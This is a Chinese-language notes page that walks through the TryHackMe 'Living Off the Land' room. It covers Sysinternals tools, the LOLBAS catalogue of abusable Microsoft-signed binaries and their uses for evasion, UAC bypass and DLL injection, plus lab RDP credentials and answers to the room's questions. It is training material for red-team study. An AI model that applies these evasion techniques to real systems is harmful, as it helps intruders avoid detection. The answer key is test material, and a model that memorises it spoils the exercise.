<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Living Off the Land - 利用现成工具 | PgDn&#x27;s Notes</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://pgup-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://pgup-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Living Off the Land - 利用现成工具 | PgDn&#x27;s Notes"><meta data-rh="true" name="description" content="在红队演练中，学习“利用现成工具”的核心概念。"><meta data-rh="true" property="og:description" content="在红队演练中，学习“利用现成工具”的核心概念。"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具" hreflang="en"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="PgDn&#39;s Notes RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="PgDn&#39;s Notes Atom Feed"><link rel="stylesheet" href="/assets/css/styles.ebd0f903.css">
<script src="/assets/js/runtime~main.e19854ae.js" defer="defer"></script>
<script src="/assets/js/main.94a3b921.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">PgDn Notes</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/category/red-teaming---红队">TryHackMe</a><a class="navbar__item navbar__link" href="/docs/category/docusaurus-备忘录">备忘录</a><a class="navbar__item navbar__link" href="/blog">博客</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/PgUp-code/PgUp-code.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/red-teaming---红队">Red Teaming - 红队</a><button aria-label="Collapse sidebar category &#x27;Red Teaming - 红队&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/host-evasions---主机规避">Host Evasions - 主机规避</a><button aria-label="Collapse sidebar category &#x27;Host Evasions - 主机规避&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Windows Internals - Windows 内部原理">Windows Internals - Windows 内部原理</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Introduction to Windows API - Windows API简介">Introduction to Windows API - Windows API简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制">Abusing Windows Internals - 滥用 Windows 内部机制</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Introduction to Antivirus - 防病毒简介">Introduction to Antivirus - 防病毒简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode">AV Evasion Shellcode - AV 绕过：Shellcode</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Obfuscation Principles - 混淆原则">Obfuscation Principles - 混淆原则</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避">Signature Evasion - 签名规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Bypassing UAC - 绕过 UAC">Bypassing UAC - 绕过 UAC</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避">Runtime Detection Evasion - 运行时检测规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控">Evading Logging and Monitoring - 绕过日志记录和监控</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具">Living Off the Land - 利用现成工具</a></li></ul></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/red-teaming---红队"><span itemprop="name">Red Teaming - 红队</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/host-evasions---主机规避"><span itemprop="name">Host Evasions - 主机规避</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Living Off the Land - 利用现成工具</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Living Off the Land - 利用现成工具</h1></header><blockquote>
<p>在红队演练中，学习“利用现成工具”的核心概念。</p>
<p><a href="https://tryhackme.com/room/livingofftheland" target="_blank" rel="noopener noreferrer">TryHackMe | Living Off the Land</a></p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction---简介">Introduction - 简介<a href="#introduction---简介" class="hash-link" aria-label="Direct link to Introduction - 简介" title="Direct link to Introduction - 简介">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="什么是living-off-the-land">什么是“Living Off the Land”？<a href="#什么是living-off-the-land" class="hash-link" aria-label="Direct link to 什么是“Living Off the Land”？" title="Direct link to 什么是“Living Off the Land”？">​</a></h3>
<p>**Living Off the Land（利用现有环境）**是红队社区中一个热门的术语。该名称来源于现实生活中“靠山吃山，靠水吃水”的概念。类似地，攻击者和恶意软件开发者会利用目标计算机上内置的工具和实用程序。</p>
<p>“Living Off the Land”这一术语最早在2013年的 <a href="https://www.youtube.com/watch?v=j-r6UonEkUw" target="_blank" rel="noopener noreferrer">DerbyCon3</a> 上提出，随后在红队社区中逐渐流行，成为一种广泛使用且颇具人气的技术。</p>
<p>这些内置工具本用于在目标系统或网络环境中执行各种日常活动；然而，近年来它们正越来越多地被滥用。例如，攻击者可能利用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil" target="_blank" rel="noopener noreferrer">CertUtil</a> 工具在目标机器上下载恶意文件。</p>
<p>其核心思想是利用微软签名的程序、脚本和库文件，以便融入系统环境，绕过防御机制。红队成员在执行渗透测试活动时，往往希望尽量避免被发现，因此使用这些工具可以更安全地保持隐蔽性。</p>
<p>以下是“Living Off the Land”涉及的一些常见类别：</p>
<ul>
<li>侦察</li>
<li>文件操作</li>
<li>任意代码执行</li>
<li>横向移动</li>
<li>绕过安全产品</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="学习目标">学习目标<a href="#学习目标" class="hash-link" aria-label="Direct link to 学习目标" title="Direct link to 学习目标">​</a></h3>
<ul>
<li>学习红队活动中“Living Off the Land”这一术语的含义。</li>
<li>学习 LOLBAS 项目及其使用方法。</li>
<li>理解并应用红队实战中的相关技术。</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="先决条件">先决条件<a href="#先决条件" class="hash-link" aria-label="Direct link to 先决条件" title="Direct link to 先决条件">​</a></h3>
<ul>
<li>具备基本的黑客技术知识。</li>
<li>完成 <a href="https://tryhackme.com/path-action/jrpenetrationtester/join" target="_blank" rel="noopener noreferrer">Jr. Penetration Tester</a> 学习路径。</li>
<li>熟悉 TryHackMe 的 <a href="https://tryhackme.com/module/red-team-initial-access" target="_blank" rel="noopener noreferrer">Red Team Initial Access 模块</a>。</li>
</ul>
<p>我们为本次实验提供了一台 Windows 10 Pro 机器。您可以使用浏览器内置功能，也可以通过 RDP 连接，但请确保已启动 AttackBox 或连接至 VPN。</p>
<p>请使用以下凭据登录：</p>
<ul>
<li>机器 IP：<code>MACHINE_IP</code></li>
<li>用户名：<code>thm</code></li>
<li>密码：<code>TryHackM3</code></li>
</ul>
<p>通过 RDP 客户端连接到该虚拟机。</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@machine$ xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="windows-sysinternals">Windows Sysinternals<a href="#windows-sysinternals" class="hash-link" aria-label="Direct link to Windows Sysinternals" title="Direct link to Windows Sysinternals">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="什么是-windows-sysinternals">﻿什么是 Windows Sysinternals？<a href="#什么是-windows-sysinternals" class="hash-link" aria-label="Direct link to ﻿什么是 Windows Sysinternals？" title="Direct link to ﻿什么是 Windows Sysinternals？">​</a></h3>
<p>Windows Sysinternals 是一套由微软开发的高级系统工具和实用程序，旨在帮助 IT 专业人士管理、排查和诊断 Windows 操作系统中的各种高级问题。</p>
<p>Sysinternals Suite 包含多个类别的工具，包括：</p>
<ul>
<li>磁盘管理</li>
<li>进程管理</li>
<li>网络工具</li>
<li>系统信息</li>
<li>安全工具</li>
</ul>
<p>要使用 Windows Sysinternals 工具，我们需要接受微软的许可协议。可以通过命令提示符中添加 <code>-accepteula</code> 参数，或在工具执行时通过 GUI 界面来接受许可协议。</p>
<p>以下是一些常用的 Windows Sysinternals 工具：</p>
<table><thead><tr><th><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noopener noreferrer">AccessChk</a></th><th>帮助系统管理员检查指定文件、目录、注册表项、全局对象及 Windows 服务的访问权限。</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener noreferrer">PsExec</a></td><td>用于在远程系统上执行程序的工具。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer" target="_blank" rel="noopener noreferrer">ADExplorer</a></td><td>一款高级的 Active Directory 工具，可轻松查看和管理 AD 数据库。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener noreferrer">ProcDump</a></td><td>用于监控运行中的进程以检测 CPU 峰值，并具备内存转储功能以供进一步分析。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener noreferrer">ProcMon</a></td><td>一款重要的进程监控工具。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview" target="_blank" rel="noopener noreferrer">TCPView</a></td><td>显示所有 TCP 和 UDP 连接的工具。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools" target="_blank" rel="noopener noreferrer">PsTools</a></td><td>Sysinternals 套件中最早设计的工具，帮助列出详细信息。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/portmon" target="_blank" rel="noopener noreferrer">Portmon</a></td><td>用于监控和显示系统上所有串行端口和并行端口活动的工具。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/whois" target="_blank" rel="noopener noreferrer">Whois</a></td><td>提供指定域名或 IP 地址的详细信息。</td></tr></tbody></table>
<p>如需了解更多有关 Sysinternals 套件的信息，请访问微软文档页面 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener noreferrer">此处</a>。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sysinternals-live">Sysinternals Live<a href="#sysinternals-live" class="hash-link" aria-label="Direct link to Sysinternals Live" title="Direct link to Sysinternals Live">​</a></h3>
<p>Windows Sysinternals 的一大优势在于无需安装即可使用。微软提供了名为 Sysinternals Live 的服务，支持多种方式访问和执行这些工具。您可以通过以下方法使用：</p>
<ul>
<li>Web 浏览器（<a href="https://live.sysinternals.com/" target="_blank" rel="noopener noreferrer">链接</a>）。</li>
<li>Windows 共享。</li>
<li>命令提示符。</li>
</ul>
<p>要使用这些工具，可以直接下载，或者在 Windows 资源管理器中输入 Sysinternals Live 路径 <code>\\live.sysinternals.com\tools</code> 进行访问。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/75af3683c5d9263c66c2ca4a9cb23a6f-296f2e6931778e9291634063cadf4a19.png" width="802" height="608" class="img_ev3q"></p>
<p><strong>注意</strong> 由于所提供的虚拟机无法访问互联网，我们已将 Sysinternals 工具预先下载至 <code>C:\Tools\</code> 目录中。</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt; C:\Tools\SysinternalsSuite\PsExec64.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果您希望进一步了解 Windows Sysinternals，建议您熟悉以下额外资源：</p>
<ol>
<li>TryHackMe 课程：<a href="https://tryhackme.com/room/btsysinternalssg" target="_blank" rel="noopener noreferrer">Sysinternals</a></li>
<li>Microsoft Sysinternals 资源 <a href="https://docs.microsoft.com/en-us/sysinternals/resources/" target="_blank" rel="noopener noreferrer">网站</a></li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="红队的利用及其优势">红队的利用及其优势<a href="#红队的利用及其优势" class="hash-link" aria-label="Direct link to 红队的利用及其优势" title="Direct link to 红队的利用及其优势">​</a></h3>
<p>尽管内置工具和 Sysinternals 工具对系统管理员非常有用，但由于这些工具在操作系统中具有固有的信任度，黑客、恶意软件和渗透测试人员也常常加以利用。</p>
<p>这种信任度对红队人员尤为有利，因为他们在目标系统上执行操作时，通常希望避免被安全控制机制发现或拦截。因此，这些工具经常被用来规避检测和其他蓝队防御机制。</p>
<p>请注意，随着越来越多的攻击者和恶意软件开发者开始使用这些工具，蓝队已意识到其潜在的恶意用途，并针对大部分工具实施了防御措施。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="lolbas-project---lolbas-项目">LOLBAS Project - LOLBAS 项目<a href="#lolbas-project---lolbas-项目" class="hash-link" aria-label="Direct link to LOLBAS Project - LOLBAS 项目" title="Direct link to LOLBAS Project - LOLBAS 项目">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="什么是-lolbas">什么是 LOLBAS？<a href="#什么是-lolbas" class="hash-link" aria-label="Direct link to 什么是 LOLBAS？" title="Direct link to 什么是 LOLBAS？">​</a></h3>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/aa5cd3489ac1c2a6c315d637bf4ba8ce-66ac61f7220ab4bda5db099ed12b4e3e.png" width="2587" height="2591" class="img_ev3q"></p>
<p>LOLBAS 代表 <strong>L</strong>iving <strong>O</strong>ff the <strong>L</strong>and <strong>B</strong>inaries <strong>A</strong>nd <strong>S</strong>cripts，项目的主要目标是收集和记录作为 Living Off the Land 技术使用的微软签名和内置工具，包括二进制文件、脚本和库。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/c98596d3c51c192ae9fd415ff06fc6b9-7480173bc0653e6855d92ad7daccdbb8.png" width="1071" height="633" class="img_ev3q"></p>
<ul>
<li>LOLBAS 项目是一个由社区驱动的仓库，收集了可能用于红队目的的二进制文件、脚本和库。它允许根据二进制文件、函数、脚本和 ATT&amp;CK 信息进行搜索。上一张图片展示了 LOLBAS 项目页面的当前样子。如果您想了解更多项目详情，可以访问项目的官方网站 <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">这里</a>。</li>
</ul>
<p>LOLBAS 网站提供了一个方便的搜索栏，用于查询所有可用的数据。查找二进制文件非常简单，只需输入二进制文件名称即可显示结果。然而，如果我们想查找特定的功能，则需要在功能名称前加上 <code>/</code>。例如，如果我们想查找所有执行功能，可以使用 <code>/execute</code>。类似地，要按类型查找，则应使用 <code>#</code> 符号后跟类型名称。以下是项目中包含的类型：</p>
<ul>
<li>脚本</li>
<li>二进制文件</li>
<li>库</li>
<li>其他微软二进制文件</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="工具标准">工具标准<a href="#工具标准" class="hash-link" aria-label="Direct link to 工具标准" title="Direct link to 工具标准">​</a></h3>
<p>要成为“Living Off the Land”技术并被接受为 LOLBAS 项目的一部分，工具必须满足以下特定标准：</p>
<ul>
<li>微软签名的操作系统原生文件或从微软下载的文件。</li>
<li>具有额外的、有趣的非预期功能，这些功能未被已知用例涵盖。</li>
<li>对 APT（高级持续性威胁）或红队活动有益。</li>
</ul>
<p>请注意，如果您发现一个符合上述标准的有趣二进制文件，可以通过访问 <a href="https://github.com/LOLBAS-Project/LOLBAS#criteria" target="_blank" rel="noopener noreferrer">GitHub 仓库贡献页面</a> 提交您的发现以获取更多信息。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="有趣的功能">有趣的功能<a href="#有趣的功能" class="hash-link" aria-label="Direct link to 有趣的功能" title="Direct link to 有趣的功能">​</a></h3>
<p>LOLBAS 项目接受符合以下功能之一的工具提交：</p>
<ul>
<li>任意代码执行</li>
<li>文件操作，包括下载、上传和复制文件</li>
<li>编译代码</li>
<li>持久性，包括在备用数据流（ADS）中隐藏数据或在登录时执行</li>
<li>UAC 绕过</li>
<li>转储进程内存</li>
<li>DLL 注入</li>
</ul>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>访问 LOLBAS 项目网站并查看其功能。然后，使用搜索栏查找 ATT&amp;CK ID: T1040。该二进制文件的名称是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Pktmon.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用搜索栏查找更多关于 MSbuild.exe 的信息。该工具的 ATT&amp;CK ID 是多少？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">T1127.001</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 